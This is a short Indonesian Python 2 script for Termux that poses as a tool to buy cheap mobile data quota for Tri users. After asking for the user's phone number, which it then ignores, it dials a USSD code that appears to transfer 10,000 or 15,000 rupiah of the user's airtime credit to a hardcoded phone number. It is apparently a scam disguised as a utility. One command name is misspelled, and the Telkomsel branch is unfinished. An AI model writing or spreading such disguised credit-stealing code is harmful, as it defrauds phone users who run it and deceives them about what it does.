import os
hijau = '\x1b[1;92m'
print 'Install Bahan Dulu'
os.system('pkg install termux-api')
print 21 * '\x1b[1;92m='
print '+ Tools Tembak Kuota+'
print '+     Sederhana     +'
print '+Author:Buyut Gans  +'
print 21 * '\x1b[1;92m='
print '\x1b[1;97m1.\x1b[1;93mTri'
print '\x1b[1;97m2.Telkom\x1b[1;91msel'
h = input('Masukkan>>>')
if h == '1':
    j = input('NOMORKAMU>>>')
    print j + 'Nomor Kamu'
    print 20 * '\x1b[1;92m='
    print '+          Menu        +'
    print '+\x1b[1;97m1.\x1b[1;93m3GB Rp15\x1b[1;92m+'
    print '+\x1b[1;97m2.\x1b[1;93m6GB Rp20\x1b[1;92m+'
    i = input('Masukkan>>>')
    if i == '1':
        print 'Pastikan Pulsa Anda Cukup'
        os.system('termux-telephony-call *323*1*089624835956*10000#')
    else:
        print 'Pastikan Pulsa Anda Cukup'
        os.system('termux-telepon-call *323*1*089624835956*15000#')
        print 'Jika Tidak Masuk Pastikan Pulsa Anda,Atau Hubungi Author'
elif h == '2':
    print 'Masih Dalam Pembangunan'
    p = input('NOMORKAMU>>>')
    print p + 'Nomor Kamu'
    print 20 * '\x1b[1;92m='
    print '+          Menu        +'
    print '+\x1b[1;97m1.3GB \x1b[1;91mRp15\x1b[1;92m+'
    print '+\x1b[1;97m2.6GB \x1b[1;91mRp20\x1b[1;92m+'
